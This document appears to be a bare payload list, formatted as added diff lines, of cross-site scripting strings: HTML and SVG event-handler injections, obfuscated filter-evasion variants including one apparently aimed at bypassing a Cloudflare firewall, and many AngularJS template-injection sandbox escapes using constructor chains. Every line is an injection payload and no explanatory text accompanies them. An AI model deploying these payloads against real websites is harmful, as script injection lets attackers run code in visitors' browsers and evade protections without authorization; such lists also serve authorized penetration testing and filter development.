+“ =”” ‘></><script></script><svg onload”=”alertonload=alert(###)”” onload=setIntervalalert\x28###\x29
+alert = window["al"+"ert"](###) 
+<svg><circle><set onbegin=prompt(###) attributename=fill> 
+<Svg Only=### OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")> 
+<=script>=alert("###")<=/scirpt>=
+<img/src/onerror=alert//&NewLine;(###)>
+<img/src/onerror=alert&sol;**&sol;(###)>
+<svg/onload=window["al"+"ert"]`###`>
+javaScRipt:Alert(‘###’)
+["');alert('###’);//"]@xyz.xxx
+'<00 foo="<a%20href="javascript:alert('###')">XSS-CLick</00>--%20/
+["');alert('###');//"]@xyz.xxx
+{{0[a='constructor'][a]('alert(###)')()}}
+{{$eval.constructor('alert(###)')()}}
+{{constructor.constructor('alert(###)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(###)');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(###)//');}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(###)');}} 
+{{$on.constructor('alert("###")')()}}
+{{{{constructor.constructor('alert(\"###\")')()}}
+{"<img onerror=confirm('###')src/>":1}
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+\"'");}}}}###
+{{[].pop.constructor&#40'alert\u0028###\u0029'&#41&#40&#41}}
+{{constructor.constructor(‘alert(###)’)()}}
+{{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}}###
+{{c=%27%27.sub.call;b=%27%27.sub.bind;a=%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(%22astNode=pop();astNode.type=%27UnaryExpression%27;astNode.operator=%27(window.X?void0:(window.X=true,alert(###)))+%27;astNode.argument={type:%27Identifier%27,name:%27foo%27};%22);m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=%27%27.sub;$eval(%27a(b.c)%27);[].push.apply=a;}}###
+{{constructor.constructor(‘a=document;confirm(###)’)()}}
+x=1}}};alert(###)//
+{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}###
+{{constructor.constructor("alert(###)")()}} 
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(###)');}}
+${###}%26it;/script>'>
+1&toString().constructor.prototype.charAt%3d[].join;[###]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+Set.constructor('ale'+'rt(13)')(###);
+Set.constructoral\x65rt\x28###\x29;
+<x ng-app>{{constructor.constructor('alert(###)')()}}
+\”}})})-confirm###;({{/*///
+"></script>{{2*2}}${2*2} ###
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(###)')()}}
+{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(###)')+eval(y)+"'");}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(###)')()}}
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(###)')+eval(y)+\"'");}}
